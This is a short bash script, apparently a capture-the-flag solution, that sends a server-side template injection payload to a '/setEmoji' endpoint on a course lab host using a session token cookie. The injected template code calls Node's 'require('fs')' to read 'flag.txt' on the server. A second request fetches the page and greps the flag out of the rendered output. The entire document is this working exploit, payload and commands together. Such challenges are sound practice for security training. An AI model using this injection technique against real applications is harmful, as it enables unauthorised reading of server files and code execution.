#!/bin/bash

token=$1

payload="<%- global.process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>"

# Send payload to inject template code
curl -s -X POST 'https://4d8e1cae.proxy.coursestack.com/setEmoji' \
-b "token=$token" \
-H 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode "emoji=$payload" > /dev/null

# Get the page and extract the flag from the rendered content
curl -s 'https://4d8e1cae.proxy.coursestack.com/' \
-b "token=$token" | grep -oE 'flag\{[^}]+\}'